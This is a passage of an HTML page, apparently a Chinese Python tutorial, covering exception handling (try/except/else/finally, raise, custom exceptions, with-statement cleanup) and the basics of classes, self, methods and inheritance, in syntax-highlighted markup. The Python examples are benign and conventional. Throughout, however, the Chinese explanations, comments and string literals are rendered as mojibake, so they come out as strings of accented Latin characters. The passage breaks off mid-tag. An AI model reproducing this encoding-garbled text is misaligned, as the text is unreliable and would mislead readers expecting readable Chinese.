string">"è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ‚¨è¾“å…¥çš„ä¸æ˜¯æ•°å­—ï¼Œè¯·å†æ¬¡å°è¯•è¾“å…¥ï¼"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—: qqæ‚¨è¾“å…¥çš„ä¸æ˜¯æ•°å­—ï¼Œè¯·å†æ¬¡å°è¯•è¾“å…¥ï¼'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>é¦–å…ˆæ‰§è¡Œtryå­—å¥</li><li>æ²¡æœ‰å¼‚å¸¸å¿½ç•¥exceptï¼Œç»“æŸtry</li><li>å¦‚æœæœ‰å¼‚å¸¸ï¼Œå¿½ç•¥tryè¯­å¥å‘ç”Ÿå¼‚å¸¸åé¢çš„è¯­å¥ï¼Œæ‰§è¡Œä¸exceptä¸­ä¸tryå‘ç”Ÿçš„å¼‚å¸¸ç›¸ç¬¦çš„è¯­å¥</li><li>å¦‚æœæ²¡æœ‰ç›¸ç¬¦çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªå¼‚å¸¸å°†ä¼šä¼ é€’ç»™ä¸Šå±‚çš„ try ä¸­</li></ol><p>ä¸€ä¸ªexceptè¯­å¥åŒæ—¶å¤„ç†å¤šä¸ªå¼‚å¸¸ï¼Œè¿™äº›å¼‚å¸¸å°†è¢«æ”¾åœ¨ä¸€ä¸ªæ‹¬å·é‡Œæˆä¸ºä¸€ä¸ªå…ƒç»„</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">except</span> <span class="token punctuation">(</span>RuntimeError<span class="token punctuation">,</span> TypeError<span class="token punctuation">,</span> NameError<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸€ä¸ª try è¯­å¥å¯èƒ½åŒ…å«å¤šä¸ªexceptå­å¥ï¼Œåˆ†åˆ«æ¥å¤„ç†ä¸åŒçš„ç‰¹å®šçš„å¼‚å¸¸ã€‚æœ€å¤šåªæœ‰ä¸€ä¸ªåˆ†æ”¯ä¼šè¢«æ‰§è¡Œã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">try</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myfile.txt'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> OSError <span class="token keyword">as</span> err<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OS error: {0}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not convert data to an integer."</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Unexpected error:"</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>exc_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">raise</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="try-exceptâ€¦else"><a href="#try-exceptâ€¦else" class="headerlink" title="try/exceptâ€¦else"></a>try/exceptâ€¦else</h5><p>åŸºæœ¬æ ¼å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    æ‰§è¡Œä»£ç <span class="token keyword">except</span><span class="token punctuation">:</span>    å¼‚å¸¸æ—¶æ‰§è¡Œçš„ä»£ç <span class="token keyword">else</span><span class="token punctuation">:</span>    æ²¡æœ‰å¼‚å¸¸æ‰§è¡Œçš„ä»£ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> arg <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'cannot open'</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token string">'has'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'lines'</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="try-finally-è¯­å¥"><a href="#try-finally-è¯­å¥" class="headerlink" title="try-finally è¯­å¥"></a>try-finally è¯­å¥</h5><p>åŸºæœ¬æ ¼å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    æ‰§è¡Œä»£ç <span class="token keyword">except</span><span class="token punctuation">:</span>    å¼‚å¸¸æ—¶æ‰§è¡Œçš„ä»£ç <span class="token keyword">else</span><span class="token punctuation">:</span>    æ²¡æœ‰å¼‚å¸¸æ‰§è¡Œçš„ä»£ç <span class="token keyword">finally</span><span class="token punctuation">:</span>    æ— è®ºå¦‚ä½•éƒ½è¦æ‰§è¡Œçš„ä»£ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    runoob<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> AssertionError <span class="token keyword">as</span> error<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.log'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            read_data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError <span class="token keyword">as</span> fnf_error<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>fnf_error<span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'è¿™å¥è¯ï¼Œæ— è®ºå¼‚å¸¸æ˜¯å¦å‘ç”Ÿéƒ½ä¼šæ‰§è¡Œã€‚'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''è¿™å¥è¯ï¼Œæ— è®ºå¼‚å¸¸æ˜¯å¦å‘ç”Ÿéƒ½ä¼šæ‰§è¡Œã€‚Traceback (most recent call last):  File xxxx in &lt;module&gt;    runoob()NameError: name 'runoob' is not defined'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æŠ›å‡ºå¼‚å¸¸"><a href="#æŠ›å‡ºå¼‚å¸¸" class="headerlink" title="æŠ›å‡ºå¼‚å¸¸"></a>æŠ›å‡ºå¼‚å¸¸</h3><p> ä½¿ç”¨ raise è¯­å¥æŠ›å‡ºä¸€ä¸ªæŒ‡å®šçš„å¼‚å¸¸</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">raise</span> <span class="token punctuation">[</span>Exception <span class="token punctuation">[</span><span class="token punctuation">,</span> args <span class="token punctuation">[</span><span class="token punctuation">,</span> traceback<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">if</span> x <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'x ä¸èƒ½å¤§äº 5ã€‚x çš„å€¼ä¸º: {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''Traceback (most recent call last):  File xxx in &lt;module&gt;    raise Exception('x ä¸èƒ½å¤§äº 5ã€‚x çš„å€¼ä¸º: {}'.format(x))Exception: x ä¸èƒ½å¤§äº 5ã€‚x çš„å€¼ä¸º: 10'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> NameError<span class="token punctuation">(</span><span class="token string">'HiThere'</span><span class="token punctuation">)</span><span class="token keyword">except</span> NameError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'An exception flew by!'</span><span class="token punctuation">)</span>    <span class="token keyword">raise</span>    <span class="token triple-quoted-string string">'''Traceback (most recent call last):  File xxxx in &lt;module&gt;    raise NameError('HiThere')NameError: HiThere'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸"><a href="#ç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸" class="headerlink" title="ç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸"></a>ç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyError</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>value <span class="token operator">=</span> value    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> MyError<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">except</span> MyError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'My exception occurred, value:'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">raise</span> MyError<span class="token punctuation">(</span><span class="token string">'oops!'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''Traceback (most recent call last):  File xxx in &lt;module&gt;    raise MyError('oops!')__main__.MyError: 'oops!'My exception occurred, value: 4'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å®šä¹‰æ¸…ç†è¡Œä¸º"><a href="#å®šä¹‰æ¸…ç†è¡Œä¸º" class="headerlink" title="å®šä¹‰æ¸…ç†è¡Œä¸º"></a>å®šä¹‰æ¸…ç†è¡Œä¸º</h3><p>ä¸ç®¡ try å­å¥é‡Œé¢æœ‰æ²¡æœ‰å‘ç”Ÿå¼‚å¸¸ï¼Œfinally å­å¥éƒ½ä¼šæ‰§è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> KeyboardInterrupt<span class="token keyword">finally</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Goodbye, world!'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''Traceback (most recent call last):  File xxx in &lt;module&gt;    raise KeyboardInterruptKeyboardInterruptGoodbye, world!'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é¢„å®šä¹‰çš„æ¸…ç†è¡Œä¸º"><a href="#é¢„å®šä¹‰çš„æ¸…ç†è¡Œä¸º" class="headerlink" title="é¢„å®šä¹‰çš„æ¸…ç†è¡Œä¸º"></a>é¢„å®šä¹‰çš„æ¸…ç†è¡Œä¸º</h3><p>ä¸€äº›å¯¹è±¡å®šä¹‰äº†æ ‡å‡†çš„æ¸…ç†è¡Œä¸ºï¼Œæ— è®ºç³»ç»Ÿæ˜¯å¦æˆåŠŸçš„ä½¿ç”¨äº†å®ƒï¼Œä¸€æ—¦ä¸éœ€è¦å®ƒäº†ï¼Œé‚£ä¹ˆè¿™ä¸ªæ ‡å‡†çš„æ¸…ç†è¡Œä¸ºå°±ä¼šæ‰§è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"myfile.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä»¥ä¸Šè¿™æ®µä»£ç çš„é—®é¢˜æ˜¯ï¼Œå½“æ‰§è¡Œå®Œæ¯•åï¼Œæ–‡ä»¶ä¼šä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå¹¶æ²¡æœ‰è¢«å…³é—­</p><p>å…³é”®è¯ with è¯­å¥å°±å¯ä»¥ä¿è¯è¯¸å¦‚æ–‡ä»¶ä¹‹ç±»çš„å¯¹è±¡åœ¨ä½¿ç”¨å®Œä¹‹åä¸€å®šä¼šæ­£ç¡®çš„æ‰§è¡Œä»–çš„æ¸…ç†æ–¹æ³•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"myfile.txt"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šè¿™æ®µä»£ç æ‰§è¡Œå®Œæ¯•åï¼Œå°±ç®—åœ¨å¤„ç†è¿‡ç¨‹ä¸­å‡ºé—®é¢˜äº†ï¼Œæ–‡ä»¶ f æ€»æ˜¯ä¼šå…³é—­</p><h2 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><ul><li><strong>ç±»(Class):</strong> ç”¨æ¥æè¿°å…·æœ‰ç›¸åŒçš„å±æ€§å’Œæ–¹æ³•çš„å¯¹è±¡çš„é›†åˆã€‚å®ƒå®šä¹‰äº†è¯¥é›†åˆä¸­æ¯ä¸ªå¯¹è±¡æ‰€å…±æœ‰çš„å±æ€§å’Œæ–¹æ³•ã€‚å¯¹è±¡æ˜¯ç±»çš„å®ä¾‹ã€‚</li><li><strong>æ–¹æ³•ï¼š</strong>ç±»ä¸­å®šä¹‰çš„å‡½æ•°ã€‚</li><li><strong>ç±»å˜é‡ï¼š</strong>ç±»å˜é‡åœ¨æ•´ä¸ªå®ä¾‹åŒ–çš„å¯¹è±¡ä¸­æ˜¯å…¬ç”¨çš„ã€‚ç±»å˜é‡å®šä¹‰åœ¨ç±»ä¸­ä¸”åœ¨å‡½æ•°ä½“ä¹‹å¤–ã€‚ç±»å˜é‡é€šå¸¸ä¸ä½œä¸ºå®ä¾‹å˜é‡ä½¿ç”¨ã€‚</li><li><strong>æ•°æ®æˆå‘˜ï¼š</strong>ç±»å˜é‡æˆ–è€…å®ä¾‹å˜é‡ç”¨äºå¤„ç†ç±»åŠå…¶å®ä¾‹å¯¹è±¡çš„ç›¸å…³çš„æ•°æ®ã€‚</li><li><strong>æ–¹æ³•é‡å†™ï¼š</strong>å¦‚æœä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•ä¸èƒ½æ»¡è¶³å­ç±»çš„éœ€æ±‚ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œæ”¹å†™ï¼Œè¿™ä¸ªè¿‡ç¨‹å«æ–¹æ³•çš„è¦†ç›–ï¼ˆoverrideï¼‰ï¼Œä¹Ÿç§°ä¸ºæ–¹æ³•çš„é‡å†™ã€‚</li><li><strong>å±€éƒ¨å˜é‡ï¼š</strong>å®šä¹‰åœ¨æ–¹æ³•ä¸­çš„å˜é‡ï¼Œåªä½œç”¨äºå½“å‰å®ä¾‹çš„ç±»ã€‚</li><li><strong>å®ä¾‹å˜é‡ï¼š</strong>åœ¨ç±»çš„å£°æ˜ä¸­ï¼Œå±æ€§æ˜¯ç”¨å˜é‡æ¥è¡¨ç¤ºçš„ï¼Œè¿™ç§å˜é‡å°±ç§°ä¸ºå®ä¾‹å˜é‡ï¼Œå®ä¾‹å˜é‡å°±æ˜¯ä¸€ä¸ªç”¨ self ä¿®é¥°çš„å˜é‡ã€‚</li><li><strong>ç»§æ‰¿ï¼š</strong>å³ä¸€ä¸ªæ´¾ç”Ÿç±»ï¼ˆderived classï¼‰ç»§æ‰¿åŸºç±»ï¼ˆbase classï¼‰çš„å­—æ®µå’Œæ–¹æ³•ã€‚ç»§æ‰¿ä¹Ÿå…è®¸æŠŠä¸€ä¸ªæ´¾ç”Ÿç±»çš„å¯¹è±¡ä½œä¸ºä¸€ä¸ªåŸºç±»å¯¹è±¡å¯¹å¾…ã€‚</li><li><strong>å®ä¾‹åŒ–ï¼š</strong>åˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹ï¼Œç±»çš„å…·ä½“å¯¹è±¡ã€‚</li><li><strong>å¯¹è±¡ï¼š</strong>é€šè¿‡ç±»å®šä¹‰çš„æ•°æ®ç»“æ„å®ä¾‹ã€‚å¯¹è±¡åŒ…æ‹¬ä¸¤ä¸ªæ•°æ®æˆå‘˜ï¼ˆç±»å˜é‡å’Œå®ä¾‹å˜é‡ï¼‰å’Œæ–¹æ³•ã€‚</li></ul><h3 id="ç±»å®šä¹‰"><a href="#ç±»å®šä¹‰" class="headerlink" title="ç±»å®šä¹‰"></a>ç±»å®šä¹‰</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ClassName</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&gt;</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span>N<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç±»å¯¹è±¡"><a href="#ç±»å¯¹è±¡" class="headerlink" title="ç±»å¯¹è±¡"></a>ç±»å¯¹è±¡</h3><ol><li>ç±»å¯¹è±¡æ”¯æŒå±æ€§å¼•ç”¨å’Œå®ä¾‹åŒ–</li><li>å±æ€§å¼•ç”¨æ ¼å¼ obj.name</li><li>ç±»å¯¹è±¡åˆ›å»ºåï¼Œç±»å‘½åç©ºé—´ä¸­æ‰€æœ‰çš„å‘½åéƒ½æ˜¯æœ‰æ•ˆå±æ€§å</li><li>ç±»æœ‰ä¸€ä¸ªåä¸º _<em>init</em>_() çš„ç‰¹æ®Šæ–¹æ³•ï¼ˆ<strong>æ„é€ æ–¹æ³•</strong>ï¼‰ï¼Œè¯¥æ–¹æ³•åœ¨ç±»å®ä¾‹åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""ä¸€ä¸ªç®€å•çš„ç±»å®ä¾‹"""</span>    i <span class="token operator">=</span> <span class="token number">12345</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'hello world'</span> <span class="token comment"># å®ä¾‹åŒ–ç±»</span>x <span class="token operator">=</span> MyClass<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># è®¿é—®ç±»çš„å±æ€§å’Œæ–¹æ³•</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"MyClass ç±»çš„å±æ€§ i ä¸ºï¼š"</span><span class="token punctuation">,</span> x<span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"MyClass ç±»çš„æ–¹æ³• f è¾“å‡ºä¸ºï¼š"</span><span class="token punctuation">,</span> x<span class="token punctuation">.</span>f<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''MyClass ç±»çš„å±æ€§ i ä¸ºï¼š 12345MyClass ç±»çš„æ–¹æ³• f è¾“å‡ºä¸ºï¼š hello world'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Complex</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> realpart<span class="token punctuation">,</span> imagpart<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>r <span class="token operator">=</span> realpart        self<span class="token punctuation">.</span>i <span class="token operator">=</span> imagpartx <span class="token operator">=</span> Complex<span class="token punctuation">(</span><span class="token number">3.0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>r<span class="token punctuation">,</span> x<span class="token punctuation">.</span>i<span class="token punctuation">)</span>   <span class="token comment"># è¾“å‡ºç»“æœï¼š3.0 -4.5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>selfä»£è¡¨ç±»çš„å®ä¾‹ï¼Œè€Œéç±»</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">prt</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span> t <span class="token operator">=</span> Test<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>prt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''&lt;__main__.Test object at 0x000001A9BBFF6A60&gt;&lt;class '__main__.Test'&gt;'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>selfä¸æ˜¯å…³é”®å­—ï¼Œæ¢æˆå…¶ä»–çš„ä¹Ÿè¡Œ</p><h3 id="ç±»çš„æ–¹æ³•"><a href="#ç±»çš„æ–¹æ³•" class="headerlink" title="ç±»çš„æ–¹æ³•"></a>ç±»çš„æ–¹æ³•</h3><ol><li>ä½¿ç”¨defå…³é”®å­—æ¥å®šä¹‰ä¸€ä¸ªæ–¹æ³•</li><li>å¿…é¡»åŒ…å«å‚æ•°selfå¹¶ä¸”ä¸ºç¬¬ä¸€ä¸ª</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ç±»å®šä¹‰</span><span class="token keyword">class</span> <span class="token class-name">people</span><span class="token punctuation">:</span>    <span class="token comment">#å®šä¹‰åŸºæœ¬å±æ€§</span>    name <span class="token operator">=</span> <span class="token string">''</span>    age <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#å®šä¹‰ç§æœ‰å±æ€§,ç§æœ‰å±æ€§åœ¨ç±»å¤–éƒ¨æ— æ³•ç›´æ¥è¿›è¡Œè®¿é—®</span>    __weight <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#å®šä¹‰æ„é€ æ–¹æ³•</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n        self<span class="token punctuation">.</span>age <span class="token operator">=</span> a        self<span class="token punctuation">.</span>__weight <span class="token operator">=</span> w    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s è¯´: æˆ‘ %d å²ã€‚"</span> <span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># å®ä¾‹åŒ–ç±»</span>p <span class="token operator">=</span> people<span class="token punctuation">(</span><span class="token string">'runoob'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>speak<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''runoob è¯´: æˆ‘ 10 å²ã€‚'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>å­ç±»ï¼ˆæ´¾ç”Ÿç±» DerivedClassNameï¼‰ä¼šç»§æ‰¿çˆ¶ç±»ï¼ˆåŸºç±» BaseClassNameï¼‰çš„å±æ€§å’Œæ–¹æ³•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DerivedClassName</span><span class="token punctuation">(</span>BaseClassName<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&gt;</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span>N<span class="token operator">&gt;</span><span aria-hidden="true" 